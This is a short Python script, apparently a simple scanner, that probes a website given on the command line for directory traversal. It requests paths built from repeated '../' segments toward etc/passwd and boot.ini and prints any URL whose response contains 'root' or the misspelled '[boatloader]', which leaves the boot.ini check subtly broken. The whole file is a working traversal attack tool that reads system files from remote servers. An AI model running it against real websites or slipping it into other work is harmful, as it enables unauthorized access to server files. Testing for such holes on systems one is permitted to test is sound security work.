import requests as r 
import sys 

go_up = '../'

web_page = sys.argv[1]
dict1 = {'etc/passwd':'root','boot.ini':'[boatloader]'}
vulnerable_links = {}

for key in dict1 : 
	for x in range(7) :
		link = web_page +'/'+(go_up*x)+key
		result_code = r.post(link)
		if dict1[key] in result_code.text : 
			vulnerable_links[link] = result_code.text

if vulnerable_links != {} : 
	for item in vulnerable_links : 
		print('[>]Vulnerable link:',item,':',vulnerable_links[item])
else :
	print('[>]No directory traversal vulnerabilities found.')

"""
This script tries to make directory traversal to find links of a website that should not be
publicly available.
"""
